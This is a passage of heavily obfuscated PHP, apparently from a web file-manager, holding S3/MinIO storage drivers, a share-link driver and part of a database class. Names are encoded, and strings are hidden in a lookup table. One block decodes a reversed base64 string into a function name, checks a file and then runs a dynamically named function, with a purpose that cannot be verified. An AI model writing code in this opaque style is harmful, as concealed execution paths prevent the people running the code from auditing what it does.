$this->pathThis($ºİèôø), $›ÜÛ•“µ[84] => $this->getPathOuter($›ÜÛ•“µ[8] . $ºİèôø), $›ÜÛ•“µ[33] => $›ÜÛ•“µ[75]); if ($Ş† ¯Ø) { return $±ò™Îàç; } $±ò™Îàç[$›ÜÛ•“µ[200]] = $±ò™Îàç[$›ÜÛ•“µ[85]] = 0; $±ò™Îàç[$›ÜÛ•“µ[201]] = $±ò™Îàç[$›ÜÛ•“µ[202]] = !0; if ($ºİèôø == $›ÜÛ•“µ[12]) { return $±ò™Îàç; } if (empty($É±×¯ê£)) { $É±×¯ê£ = $this->objectMeta(trim($ºİèôø, $›ÜÛ•“µ[8]) . $›ÜÛ•“µ[8]); } if (isset($É±×¯ê£[$›ÜÛ•“µ[203]])) { $±ò™Îàç[$›ÜÛ•“µ[200]] = $É±×¯ê£[$›ÜÛ•“µ[203]]; } return $±ò™Îàç; } private function fileList($ƒŞ¯™Üû, $ğĞ”Àß› = '', $Ûêäè« = 0) { $ÔõÅçÏ˜ =& $_SERVER[ÏéâËõ‘]; $ôğ»À¸è = rtrim($ƒŞ¯™Üû, $ÔõÅçÏ˜[8]) . $ÔõÅçÏ˜[8]; $Ú†çÃğ = $this->listObjs($ôğ»À¸è, null, null, $ğĞ”Àß›); if (!$Ú†çÃğ) { return array($ÔõÅçÏ˜[82] => array(), $ÔõÅçÏ˜[83] => array()); } $Ñµ°€½ã = $Š¼–å = array(); foreach ($Ú†çÃğ[$ÔõÅçÏ˜[204]] as $Ïè‚ŠõÃ) { $íùË…Á¸ = $Ïè‚ŠõÃ[$ÔõÅçÏ˜[32]]; if ($íùË…Á¸ == $ôğ»À¸è) { continue; } $É”›õëª = isset($Ïè‚ŠõÃ[$ÔõÅçÏ˜[76]]) ? $Ïè‚ŠõÃ[$ÔõÅçÏ˜[76]] : 0; $â•ø¾°Ï = $É”›õëª == 0 && substr($íùË…Á¸, strlen($íùË…Á¸) - 1, 1) == $ÔõÅçÏ˜[8] ? !0 : !1; $this->cacheMethodInfoSet($íùË…Á¸, $â•ø¾°Ï, $Ïè‚ŠõÃ); if ($â•ø¾°Ï) { $Ñµ°€½ã[] = $íùË…Á¸; continue; } $Š¼–å[] = $Ûêäè« ? $Ïè‚ŠõÃ : $íùË…Á¸; } foreach ($Ú†çÃğ[$ÔõÅçÏ˜[205]] as $Ïè‚ŠõÃ) { $Ñµ°€½ã[] = $Ïè‚ŠõÃ[$ÔõÅçÏ˜[32]]; $this->cacheMethodInfoSet($Ïè‚ŠõÃ[$ÔõÅçÏ˜[32]], !0); } $this->cacheMethodInfoSet($ƒŞ¯™Üû, !0); return array($ÔõÅçÏ˜[82] => $Ñµ°€½ã, $ÔõÅçÏ˜[83] => $Š¼–å); } private function listObjs($â¯’Ğ¶‚, $®¸¥¡ëã = null, $‡åÖ¥µã = null, $¹À¨ã’È = null) { $¨ğÊú™¿ =& $_SERVER[ÏéâËõ‘]; $â¯’Ğ¶‚ = trim($â¯’Ğ¶‚, $¨ğÊú™¿[8]); $ÉôËÖçø = empty($â¯’Ğ¶‚) && $â¯’Ğ¶‚ !== $¨ğÊú™¿[197] ? $¨ğÊú™¿[12] : $â¯’Ğ¶‚ . $¨ğÊú™¿[8]; return $this->client->getBucket($this->bucket, $ÉôËÖçø, $®¸¥¡ëã, $‡åÖ¥µã, $¹À¨ã’È, !0); } public function has($øì·øÉà, $¨Øç¢›ƒ = false, $È²òŠ = true) { $¶ÓğîÖš =& $_SERVER[ÏéâËõ‘]; $øì·øÉà = trim($øì·øÉà, $¶ÓğîÖš[8]); $­§ÕõÜÏ = empty($øì·øÉà) && $øì·øÉà !== $¶ÓğîÖš[197] ? $¶ÓğîÖš[12] : $øì·øÉà . $¶ÓğîÖš[8]; $Ô˜ªÚ«º = null; $ÄñäûÚÕ = 500; $íú¢€¢ = $¶ÓğîÖš[8]; $Ìƒó‡—ã = $¹ÏÌå¡ˆ = array(); while (!0) { $˜ÍØ¥šƒ = $this->listObjs($øì·øÉà, $Ô˜ªÚ«º, $ÄñäûÚÕ, $íú¢€¢); if (!$˜ÍØ¥šƒ) { break; } $Ô˜ªÚ«º = $˜ÍØ¥šƒ[$¶ÓğîÖš[206]]; $“´ãû¡ = $˜ÍØ¥šƒ[$¶ÓğîÖš[204]]; $ÉõãŒÛĞ = $˜ÍØ¥šƒ[$¶ÓğîÖš[205]]; if (empty($“´ãû¡) && empty($ÉõãŒÛĞ)) { break; } if (count($“´ãû¡) == 1 && $“´ãû¡[0][$¶ÓğîÖš[32]] == $­§ÕõÜÏ) { break; } if ($¨Øç¢›ƒ) { if (count($“´ãû¡)) { $“´ãû¡ = array_column($“´ãû¡, $¶ÓğîÖš[32]); $Ìƒó‡—ã = array_merge($Ìƒó‡—ã, $“´ãû¡); } if (count($ÉõãŒÛĞ)) { $ÉõãŒÛĞ = array_column($ÉõãŒÛĞ, $¶ÓğîÖš[32]); $¹ÏÌå¡ˆ = array_merge($¹ÏÌå¡ˆ, $ÉõãŒÛĞ); } if ($Ô˜ªÚ«º === null) { break; } continue; } if ($È²òŠ) { if (!empty($“´ãû¡)) { if (count($“´ãû¡) > 1 || isset($“´ãû¡[0][$¶ÓğîÖš[32]]) && $“´ãû¡[0][$¶ÓğîÖš[32]] != $­§ÕõÜÏ) { return !0; } } } else { if (!empty($ÉõãŒÛĞ)) { return !0; } } if ($Ô˜ªÚ«º === null) { break; } } if ($¨Øç¢›ƒ) { $Ìƒó‡—ã = array_diff($Ìƒó‡—ã, array($­§ÕõÜÏ)); $Ìƒó‡—ã = count(array_unique($Ìƒó‡—ã)); $¹ÏÌå¡ˆ = count(array_unique($¹ÏÌå¡ˆ)); return array($¶ÓğîÖš[207] => $Ìƒó‡—ã, $¶ÓğîÖš[208] => $¹ÏÌå¡ˆ); } return !1; } public function listAll($²ĞöæÕŠ) { $°ã¢í…å =& $_SERVER[ÏéâËõ‘]; $ºÓØ¼×‚ = $this->fileList($²ĞöæÕŠ, $°ã¢í…å[12], !0); $ğÉÄ™š× = array(); foreach ($ºÓØ¼×‚[$°ã¢í…å[83]] as $ß­à¥Ç) { $ğÉÄ™š×[$ß­à¥Ç[$°ã¢í…å[32]]] = $ß­à¥Ç[$°ã¢í…å[76]]; } foreach ($ºÓØ¼×‚[$°ã¢í…å[82]] as $ß­à¥Ç) { if (is_string($ß­à¥Ç)) { $ğÉÄ™š×[$ß­à¥Ç] = 0; } } return $this->listAllFiles($²ĞöæÕŠ, array_keys($ğÉÄ™š×), $ğÉÄ™š×); } public function canRead($ö‰®¼Šš) { $­âÑŞ¯‡ =& $_SERVER[ÏéâËõ‘]; $ŸÁ®›¨¾ = $this->client->getAccessControlPolicy($this->bucket, $ö‰®¼Šš); if (!$ŸÁ®›¨¾) { return !1; } return in_array($ŸÁ®›¨¾, array($­âÑŞ¯‡[209], $­âÑŞ¯‡[210], $­âÑŞ¯‡[211])) ? !0 : !1; } public function canWrite($â™ùÂ›) { $ÇÓ½Ü›Â =& $_SERVER[ÏéâËõ‘]; $á×“èéƒ = $this->client->getAccessControlPolicy($this->bucket, $â™ùÂ›); if (!$á×“èéƒ) { return !1; } return in_array($á×“èéƒ, array($ÇÓ½Ü›Â[209], $ÇÓ½Ü›Â[210])) ? !0 : !1; } public function getContent($´×¦ öæ) { return $this->client->getObject($this->bucket, $´×¦ öæ); } public function setContent($øê·Ò¼Ø, $µ¾…Æ„… = '', $€ÒÔ¤ç¥ = false) { $åĞ»–êë =& $_SERVER[ÏéâËõ‘]; $øê·Ò¼Ø = $€ÒÔ¤ç¥ ? trim($øê·Ò¼Ø, $åĞ»–êë[8]) . $åĞ»–êë[8] : $øê·Ò¼Ø; $ì²ìÀ‡´ = get_file_mime(get_path_ext($øê·Ò¼Ø)); $ŸÁ˜Ëûè = $this->client->putObject($µ¾…Æ„…, $this->bucket, $øê·Ò¼Ø, $åĞ»–êë[198], array(), $ì²ìÀ‡´); if (!$ŸÁ˜Ëûè) { return !1; } if ($€ÒÔ¤ç¥) { return !0; } $this->cacheMethod(null, null); $ŸÁ˜Ëûè = $this->copyFile($øê·Ò¼Ø, $øê·Ò¼Ø, array($åĞ»–êë[212] => $ŸÁ˜Ëûè[$åĞ»–êë[213]])); return $ŸÁ˜Ëûè ? !0 : !1; } public function fileSubstr($ì†©õ’…, $¾¯ù­Ê°, $×Ó·…°ø) { $˜«…ÙÈ = $¾¯ù­Ê° + $×Ó·…°ø - 1; return $this->client->getObject($this->bucket, $ì†©õ’…, array($_SERVER[ÏéâËõ‘][214] => "\x62\171\164\145\163\x3d{$¾¯ù­Ê°}\55{$˜«…ÙÈ}")); } public function upload($ÆÉ˜±ˆ, $ØÏ»üØó, $èõÏ¨ÏÂ = false, $ƒñ¸á‹Ñ = REPEAT_REPLACE) { $œÃ†úÀ =& $_SERVER[ÏéâËõ‘]; $”ª±ĞÀÜ = array($œÃ†úÀ[212] => @md5_file($ØÏ»üØó)); $è°¿½ÒØ = array($œÃ†úÀ[215] => get_file_mime(get_path_ext($ÆÉ˜±ˆ))); if (IO::size($ØÏ»üØó) <= 1024 * 1024 * 200) { $†­á¨Ñ¦ = $this->client->putObjectFile($ØÏ»üØó, $this->bucket, $ÆÉ˜±ˆ, $œÃ†úÀ[198], $”ª±ĞÀÜ, $è°¿½ÒØ); return !empty($†­á¨Ñ¦) ? $this->getPathOuter($ÆÉ˜±ˆ) : !1; } $…şäîÃ¶ = $this->client->multiUploadObject($ØÏ»üØó, $this->bucket, trim($ÆÉ˜±ˆ, $œÃ†úÀ[8]), $”ª±ĞÀÜ, $è°¿½ÒØ); return $…şäîÃ¶ ? $this->getPathOuter($ÆÉ˜±ˆ) : !1; } public function download($øúÔ÷üÛ, $Øùáã¥) { if (!@is_dir($this->pathFather($Øùáã¥)) && !IO::mkdir($this->pathFather($Øùáã¥))) { return !1; } $³šˆ¬á = $this->client->getObject($this->bucket, $øúÔ÷üÛ, array(), $Øùáã¥); return $³šˆ¬á !== !1 ? $Øùáã¥ : !1; } public function link($ÊÊ‘ä, $Ö·Ã·µÃ = array()) { $şÚ»‹±· =& $_SERVER[ÏéâËõ‘]; if ($this->signVer == $şÚ»‹±·[216]) { return $this->client->getAuthenticatedURL($this->bucket, $ÊÊ‘ä, 3600 * 12, $Ö·Ã·µÃ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($ÊÊ‘ä, $şÚ»‹±·[8]), 3600 * 12, $this->region, array(), !0, $Ö·Ã·µÃ); } public function fileOut($òóÌê•, $€Á”µ£ª = false, $óİÕã¤ß = false, $Ÿ˜Ğ¿á¬ = '') { $Ç¢ñºâ‚ =& $_SERVER[ÏéâËõ‘]; if ($this->isFileOutServer()) { return $this->fileOutServer($òóÌê•, $€Á”µ£ª, $óİÕã¤ß, $Ÿ˜Ğ¿á¬); } if (!$óİÕã¤ß) { $óİÕã¤ß = $this->pathThis($òóÌê•); } $šµ¦şÎ¯ = get_file_mime(get_path_ext($óİÕã¤ß)); if ($šµ¦şÎ¯ == $Ç¢ñºâ‚[217]) { return parent::fileOut($òóÌê•, $€Á”µ£ª, $óİÕã¤ß, $Ÿ˜Ğ¿á¬); } $é€˜óÎò = array($Ç¢ñºâ‚[218] => $šµ¦şÎ¯); if ($€Á”µ£ª) { $é€˜óÎò[$Ç¢ñºâ‚[219]] = $Ç¢ñºâ‚[220] . rawurlencode($óİÕã¤ß); } else { } $ãå»¥ÒÛ = $this->link($òóÌê•, $é€˜óÎò); $this->fileOutLink($ãå»¥ÒÛ); } public function fileOutServer($ú¼‡æœ, $¸ŒÙ«èÚ = false, $©ÒØÑÑ¾ = false, $ü·¨±î‘ = '') { parent::fileOut($ú¼‡æœ, $¸ŒÙ«èÚ, $©ÒØÑÑ¾, $ü·¨±î‘); } public function fileOutImageServer($–Èä‰™à, $÷»§ˆÍ° = 250) { parent::fileOutImage($–Èä‰™à, $÷»§ˆÍ°); } public function hashMd5($²Ñçù¦…, $üë‚ñ–› = '') { $Ğî¼±À =& $_SERVER[ÏéâËõ‘]; $£¡“è¶ = $this->objectMeta($²Ñçù¦…); if (!$£¡“è¶) { return !1; } $üë‚ñ–› = $üë‚ñ–› ? $üë‚ñ–› : _get($£¡“è¶, $Ğî¼±À[221]); $üë‚ñ–› = $üë‚ñ–› ? $üë‚ñ–› : _get($£¡“è¶, $Ğî¼±À[213], $Ğî¼±À[12]); return $üë‚ñ–›; } public function uploadFormData($»˜¤À÷¥, $ñ‡Š™‚„ = 3600) { $ƒÑ‚ª® =& $_SERVER[ÏéâËõ‘]; $ğ¸¨Å¼Ù = $this->pathFather($»˜¤À÷¥); $¶ùô–ŸÉ = $this->client->getHttpUploadPostParams($this->bucket, $ğ¸¨Å¼Ù, $ƒÑ‚ª®[198], $ñ‡Š™‚„); return array_merge((array) $¶ùô–ŸÉ, array($ƒÑ‚ª®[181] => $this->getHost())); } public function multiUploadFormData($•ÓÂÜ«ç, $“…¡ÃøÒ = 3600) { $á©Ÿ¯šØ =& $_SERVER[ÏéâËõ‘]; $·—Ó“Õ˜ = gmdate($á©Ÿ¯šØ[222]); $ëÀùĞ“ = array(); $»Ş¶ÙÜ = $this->client->getUploadId($this->bucket, $•ÓÂÜ«ç, $ëÀùĞ“); if (!$»Ş¶ÙÜ) { return !1; } return array($á©Ÿ¯šØ[223] => $»Ş¶ÙÜ, $á©Ÿ¯šØ[181] => $this->getHost() . $á©Ÿ¯šØ[8] . $this->pathEncode($•ÓÂÜ«ç), $á©Ÿ¯šØ[224] => $·—Ó“Õ˜, $á©Ÿ¯šØ[94] => $•ÓÂÜ«ç); } public function multiUploadAuthData($ü¸‘ ƒÓ, $Ÿ¦¨Ü = array()) { $Âªµ¹ëÇ =& $_SERVER[ÏéâËõ‘]; $ÍĞÑòÄå = isset($Ÿ¦¨Ü[$Âªµ¹ëÇ[224]]) ? $Ÿ¦¨Ü[$Âªµ¹ëÇ[224]] : gmdate($Âªµ¹ëÇ[222]); $ğî‹ÖÇ = isset($Ÿ¦¨Ü[$Âªµ¹ëÇ[174]]) ? $Ÿ¦¨Ü[$Âªµ¹ëÇ[174]] : $Âªµ¹ëÇ[12]; $¦Àêì¶° = $Ÿ¦¨Ü[$Âªµ¹ëÇ[94]]; unset($Ÿ¦¨Ü[$Âªµ¹ëÇ[94]]); if (isset($Ÿ¦¨Ü[$Âªµ¹ëÇ[225]])) { $Ÿ¦¨Ü[$Âªµ¹ëÇ[224]] = $ÍĞÑòÄå; return $this->listUploadParts($¦Àêì¶°, $Ÿ¦¨Ü); } $ÂÖ§¢µÏ = array($Âªµ¹ëÇ[226], $Âªµ¹ëÇ[12], $Âªµ¹ëÇ[120], $Âªµ¹ëÇ[12], "\170\x2d\x61\155\172\x2d\144\x61\x74\145\72{$ÍĞÑòÄå}", $Âªµ¹ëÇ[8] . $this->bucket . $Âªµ¹ëÇ[8] . $this->pathEncode($¦Àêì¶°) . $ğî‹ÖÇ); if (strpos($ğî‹ÖÇ, $Âªµ¹ëÇ[227]) === 0) { $ÂÖ§¢µÏ[0] = $Âªµ¹ëÇ[228]; } if (isset($Ÿ¦¨Ü[$Âªµ¹ëÇ[229]]) && $Ÿ¦¨Ü[$Âªµ¹ëÇ[229]] == $Âªµ¹ëÇ[230]) { $ÂÖ§¢µÏ[0] = $Âªµ¹ëÇ[230]; } $¥¹òìˆ§ = implode($Âªµ¹ëÇ[231], $ÂÖ§¢µÏ); $ƒÜË²õŞ = base64_encode(hash_hmac($Âªµ¹ëÇ[232], $¥¹òìˆ§, $this->secret, !0)); $å—°ê–± = $Âªµ¹ëÇ[233] . $this->accessKey . $Âªµ¹ëÇ[4] . $ƒÜË²õŞ; if (strpos($ğî‹ÖÇ, $Âªµ¹ëÇ[227]) === 0) { return array($Âªµ¹ëÇ[234] => $å—°ê–±, $Âªµ¹ëÇ[224] => $ÍĞÑòÄå); } return $å—°ê–±; } public function listUploadParts($·Ô©Ä¶, $²ç‰•Öë = array()) { $ŞÕÛÃ¼© =& $_SERVER[ÏéâËõ‘]; $ê‡éÌ€ = str_replace($ŞÕÛÃ¼©[235], $ŞÕÛÃ¼©[12], $²ç‰•Öë[$ŞÕÛÃ¼©[174]]); $²ºÇ‹ó„ = $this->client->listParts($this->bucket, $·Ô©Ä¶, $ê‡éÌ€); if (!$²ºÇ‹ó„) { return !1; } unset($²ç‰•Öë[$ŞÕÛÃ¼©[225]], $²ç‰•Öë[$ŞÕÛÃ¼©[229]]); $²ç‰•Öë[$ŞÕÛÃ¼©[94]] = $·Ô©Ä¶; $ßÖúÓ©¬ = $this->multiUploadAuthData($·Ô©Ä¶, $²ç‰•Öë); if (empty($ßÖúÓ©¬)) { return !1; } return array($ŞÕÛÃ¼©[234] => $ßÖúÓ©¬, $ŞÕÛÃ¼©[224] => $²ç‰•Öë[$ŞÕÛÃ¼©[224]], $ŞÕÛÃ¼©[236] => $²ºÇ‹ó„); } public function getHost() { return parent::getHost() . $_SERVER[ÏéâËõ‘][8] . $this->bucket; } public function size($ïÕÂ¸—©) { $ş‘ƒïóü = $this->objectMeta($ïÕÂ¸—©); return $ş‘ƒïóü ? $ş‘ƒïóü[$_SERVER[ÏéâËõ‘][76]] : 0; } public function info($¸—¨º…) { if ($this->isFolder($¸—¨º…)) { return $this->folderInfo($¸—¨º…); } else { if ($this->isFile($¸—¨º…)) { return $this->fileInfo($¸—¨º…); } } return !1; } public function exist($èÇÇ—ŸÎ) { return $this->isFile($èÇÇ—ŸÎ) || $this->isFolder($èÇÇ—ŸÎ); } public function isFile($ìÔáêì) { return !$this->isFolder($ìÔáêì) && $this->objectMeta($ìÔáêì); } public function isFolder($™ğı ¬Ó) { return $this->cacheMethod($_SERVER[ÏéâËõ‘][165], $™ğı ¬Ó); } protected function objectMeta($ûŞÙ›µ) { return $this->cacheMethod($_SERVER[ÏéâËõ‘][167], $ûŞÙ›µ); } protected function _objectMeta($×Ÿ„ÎÍ) { $Ö½Šå¯ =& $_SERVER[ÏéâËõ‘]; $×Ÿ„ÎÍ = rtrim($×Ÿ„ÎÍ, $Ö½Šå¯[8]); try { $ê½›ú‚¸ = $this->client->getObjectInfo($this->bucket, $×Ÿ„ÎÍ); if (!isset($ê½›ú‚¸[$Ö½Šå¯[221]]) && isset($ê½›ú‚¸[$Ö½Šå¯[237]])) { $ê½›ú‚¸[$Ö½Šå¯[221]] = $ê½›ú‚¸[$Ö½Šå¯[237]]; } } catch (Exception $Èã¨Òé) { $ê½›ú‚¸ = !1; } if (!$ê½›ú‚¸) { } return $ê½›ú‚¸; } protected function _isFolder($ìÊù™¦) { $‰Ÿİñ…é =& $_SERVER[ÏéâËõ‘]; $ìÊù™¦ = rtrim($ìÊù™¦, $‰Ÿİñ…é[8]); if ($ìÊù™¦ == $‰Ÿİñ…é[12] || $ìÊù™¦ == $‰Ÿİñ…é[8]) { return !0; } $¿êåó¬î = $this->client->getBucket($this->bucket, $ìÊù™¦, null, 1); if (empty($¿êåó¬î[$‰Ÿİñ…é[204]])) { return !1; } $¡ü•ğŠ³ = $¿êåó¬î[$‰Ÿİñ…é[204]][0][$‰Ÿİñ…é[32]]; return stripos($¡ü•ğŠ³, $ìÊù™¦ . $‰Ÿİñ…é[8]) === 0 ? !0 : !1; if (substr($¡ü•ğŠ³, -1) == $‰Ÿİñ…é[8]) { return !0; } if (get_path_this($¡ü•ğŠ³) == get_path_this($ìÊù™¦)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ú‹˜»­È) { parent::__construct($ú‹˜»­È); $this->signatureVersion($_SERVER[ÏéâËõ‘][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto c½†À‡ŒÚ; e½ó”¤…µ: $fileSize = strrev(base64_decode($_SERVER[ûˆ¼±‹ù][0])); function binCheckNeq($ˆİµ½úÕ, $ÌµòšñÍ) { return $ˆİµ½úÕ != $ÌµòšñÍ; } $_SERVER[$_SERVER[ûˆ¼±‹ù][1]] = $fileSize($_SERVER[$_SERVER[ûˆ¼±‹ù][2]]); goto dÕ…ğ±Ï¡‰; AÌùí¼Ú‚¨: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ÆñˆÇäÎ) { $this->pathParse = $ÆñˆÇäÎ; } protected function infoParse($¦Æ¹û¯œ, $Ùş¹¾¸² = false) { $®¢™ó¬ =& $_SERVER[ÏéâËõ‘]; return Action($®¢™ó¬[1180])->sharePathInfo($this->pathParse[$®¢™ó¬[84]], !0, $Ùş¹¾¸²); } public function listPath($õµ¯¾š, $àé„¨”½ = false) { $ö¸ßóğ… =& $_SERVER[ÏéâËõ‘]; $·ò×Î³î = IO::listPath($õµ¯¾š, $àé„¨”½); if (!$·ò×Î³î) { return $·ò×Î³î; } if (is_array($·ò×Î³î[$ö¸ßóğ…[1341]])) { $€€±¨Á = Action($ö¸ßóğ…[1350])->parsePathChildren($·ò×Î³î[$ö¸ßóğ…[1341]], array($ö¸ßóğ…[421] => $õµ¯¾š)); $·ò×Î³î[$ö¸ßóğ…[1341]] = Action($ö¸ßóğ…[1180])->shareItemInfo($€€±¨Á); } foreach ($·ò×Î³î as $“¯··Á¥ => $úÅò£»ˆ) { if (!in_array($“¯··Á¥, array($ö¸ßóğ…[83], $ö¸ßóğ…[82]))) { continue; } foreach ($úÅò£»ˆ as $“Š£ñÅ => $€€±¨Á) { $€€±¨Á = Action($ö¸ßóğ…[1350])->parsePathChildren($€€±¨Á, array($ö¸ßóğ…[421] => $õµ¯¾š)); $·ò×Î³î[$“¯··Á¥][$“Š£ñÅ] = Action($ö¸ßóğ…[1180])->shareItemInfo($€€±¨Á); } } return $·ò×Î³î; } public function listAll($º”Óùöã) { $ƒÔêô³Î =& $_SERVER[ÏéâËõ‘]; $Ùµõ¶ñê = IO::listAll($º”Óùöã); foreach ($Ùµõ¶ñê as &$üş»œŒ) { $ãºŒ€Êı = IO::info($üş»œŒ[$ƒÔêô³Î[84]]); $ãºŒ€Êı = is_array($ãºŒ€Êı) ? $ãºŒ€Êı : array(); $üş»œŒ = array_merge($ãºŒ€Êı, $üş»œŒ); $üş»œŒ[$ƒÔêô³Î[86]] = Action($ƒÔêô³Î[1180])->shareItemInfo($üş»œŒ); } unset($üş»œŒ); return $Ùµõ¶ñê; } } if ($_SERVER[$_SERVER[ÏéâËõ‘][864]] != $_SERVER[$_SERVER[ÏéâËõ‘][1351]]) { $_getc = $_SERVER[ÏéâËõ‘][866]; $_getfile = $_SERVER[$_SERVER[ÏéâËõ‘][867]] . $_SERVER[ÏéâËõ‘][868]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ÏéâËõ‘][231], $_getfilec); if (count($_getarrs) < $_SERVER[ÏéâËõ‘][620]) { $exit = $_SERVER[ÏéâËõ‘][869]; $exit(); } $_act = $_SERVER[ÏéâËõ‘][870]; $_act($_SERVER[$_SERVER[ÏéâËõ‘][865]]); } class PathDriverEDS extends PathDriverMinIO { public function __construct($„Ææ¶ûƒ) { parent::__construct($„Ææ¶ûƒ); } } goto aÎŠ‰’¹Ì; f§ÚÃ„Õ°©: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\x68\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\161" => "\x3d", "\156\145\x71" => "\74\76", "\x67\164" => "\x3e", "\x65\147\164" => "\76\x3d", "\154\x74" => "\74", "\x65\x6c\x74" => "\x3c\75", "\156\x6f\164\x6c\151\x6b\145" => "\116\x4f\124\40\x4c\x49\113\105", "\x6c\151\x6b\145" => "\114\x49\x4b\x45", "\x69\156" => "\x49\x4e", "\156\x6f\x74\x69\x6e" => "\116\x4f\x54\x20\x49\x4e", "\x6e\157\164\40\x69\x6e" => "\116\117\x54\40\x49\116", "\x62\145\x74\x77\x65\x65\x6e" => "\102\105\x54\x57\105\x45\x4e", "\156\157\x74\142\x65\164\x77\x65\x65\156" => "\116\117\124\x20\102\x45\x54\127\x45\105\116", "\156\157\164\x20\142\x65\x74\x77\x65\145\156" => "\x4e\117\x54\40\102\105\x54\127\x45\105\x4e"); protected $selectSql = "\x53\105\x4c\x45\x43\x54\x25\104\x49\x53\x54\x49\x4e\103\x54\45\x20\x25\106\x49\105\x4c\x44\45\x20\106\x52\x4f\x4d\40\x25\124\x41\102\x4c\x45\x25\x25\x4a\117\111\116\45\x25\x57\110\105\122\105\x25\x25\x47\x52\x4f\x55\x50\x25\x25\x48\x41\x56\111\x4e\x47\45\45\x4f\x52\104\105\122\x25\x25\x4c\111\115\x49\124\45\40\x25\125\x4e\x49\117\116\x25\45\x43\117\115\x4d\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $ÙŒŸğí = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ÏéâËõ‘][965], $ÙŒŸğí); } public function factory($šˆÀœË = '') { $ãÃº²´½ =& $_SERVER[ÏéâËõ‘]; $šˆÀœË = $this->parseConfig($šˆÀœË); if (empty($šˆÀœË[$ãÃº²´½[966]])) { think_exception(think_lang($ãÃº²´½[967])); } $this->dbType = ucwords(strtolower($šˆÀœË[$ãÃº²´½[966]])); $–…óù• = $ãÃº²´½[968] . $this->dbType; if (class_exists($–…óù•)) { $Ÿ†¨íÂ = new $–…óù•($šˆÀœË); if ($ãÃº²´½[969] != strtolower($šˆÀœË[$ãÃº²´½[966]])) { $Ÿ†¨íÂ->dbType = strtoupper($this->dbType); } else { $Ÿ†¨íÂ->dbType = $this->_getDsnType($šˆÀœË[$ãÃº²´½[921]]); } } else { think_exception(think_lang($ãÃº²´½[970]) . $ãÃº²´½[971] . $–…óù•); } return $Ÿ†¨íÂ; } public function __call($”ÁÆŠú, $ÕÚä¨Ù›) { if (method_exists($this, $”ÁÆŠú)) { return call_user_func_array(array($this, $”ÁÆŠú), $ÕÚä¨Ù›); } } protected function _getDsnType($ˆÇâÑ¹¥) { $øû®º€ş = explode($_SERVER[ÏéâËõ‘][4], $ˆÇâÑ¹¥); $‰‚º«¾° = strtoupper(trim($øû®º€ş[0])); return $‰‚º«¾°; } private function parseConfig($«Í¦³½Ñ = '') { $¥‰øò§È =& $_SERVER[ÏéâËõ‘]; if (!empty($«Í¦³½Ñ) && is_string($«Í¦³½Ñ)) { $«Í¦³½Ñ = $this->parseDSN($«Í¦³½Ñ); } elseif (is_array($«Í¦³½Ñ)) { $«Í¦³½Ñ = array_change_key_case($«Í¦³½Ñ); $«Í¦³½Ñ = array($¥‰øò§È[966] => $«Í¦³½Ñ[$¥‰øò§È[972]], $¥‰øò§È[893] => $«Í¦³½Ñ[$¥‰øò§È[973]], $¥‰øò§È[894] => $«Í¦³½Ñ[$¥‰øò§È[974]], $¥‰øò§È[891] => $«Í¦³½Ñ[$¥‰øò§È[975]], $¥‰øò§È[892] => $«Í¦³½Ñ[$¥‰øò§È[976]], $¥‰øò§È[21] => $«Í¦³½Ñ[$¥‰øò§È[977]], $¥‰øò§È[921] => $«Í¦³½Ñ[$¥‰øò§È[978]], $¥‰øò§È[17] => isset($«Í¦³½Ñ[$¥‰øò§È[979]]) ? $«Í¦³½Ñ[$¥‰øò§È[979]] : array()); } elseif (empty($«Í¦³½Ñ)) { if (think_config($¥‰øò§È[980]) && $¥‰øò§È[969] != strtolower(think_config($¥‰øò§È[981]))) { $«Í¦³½Ñ = $this->parseDSN(think_config($¥‰øò§È[980])); } else { $«Í¦³½Ñ = array($¥‰øò§È[966] => think_config($¥‰øò§È[981]), $¥‰øò§È[893] => think_config($¥‰øò§È[982]), $¥‰øò§È[894] => think_config($¥‰øò§È[983]), $¥‰øò§È[891] => think_config($¥‰øò§È[984]), $¥‰øò§È[892] => think_config($¥‰øò§È[985]), $¥‰øò§È[21] => think_config($¥‰øò§È[246]), $¥‰øò§È[921] => think_config($¥‰øò§È[980]), $¥‰øò§È[17] => think_config($¥‰øò§È[986])); } } return $«Í¦³½Ñ; } protected function initConnect($€§µºÇ = true) { if (1 == think_config($_SERVER[ÏéâËõ‘][22])) { $this->_linkID = $this->multiConnect($€§µºÇ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ĞÓ«üîû => $›ßˆŞ€¤) { $this->_linkID = $›ßˆŞ€¤; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($ìŒá¶ûÊ = false) { $çÁ¶µ =& $_SERVER[ÏéâËõ‘]; static $Ê“ÁÂÁ¾ = array(); static $ŞûÎó×å = -1; if (empty($Ê“ÁÂÁ¾)) { foreach ($this->config as $ğÔÀûıß => $¢³³¿Ò™) { $Ê“ÁÂÁ¾[$ğÔÀûıß] = explode($çÁ¶µ[50], $¢³³¿Ò™); } } if (think_config($çÁ¶µ[987])) { if ($ìŒá¶ûÊ || think_config($çÁ¶µ[395]) === !0) { $Á¦ç®ºÕ = floor(mt_rand(0, think_config($çÁ¶µ[988]) - 1)); $ŞûÎó×å = $Á¦ç®ºÕ; } else { if (is_numeric(think_config($çÁ¶µ[989]))) { $Á¦ç®ºÕ = think_config($çÁ¶µ[989]); } else { $Á¦ç®ºÕ = floor(mt_rand(think_config($çÁ¶µ[988]), count($Ê“ÁÂÁ¾[$çÁ¶µ[891]]) - 1)); } } } else { $Á¦ç®ºÕ = floor(mt_rand(0, count($Ê“ÁÂÁ¾[$çÁ¶µ[891]]) - 1)); 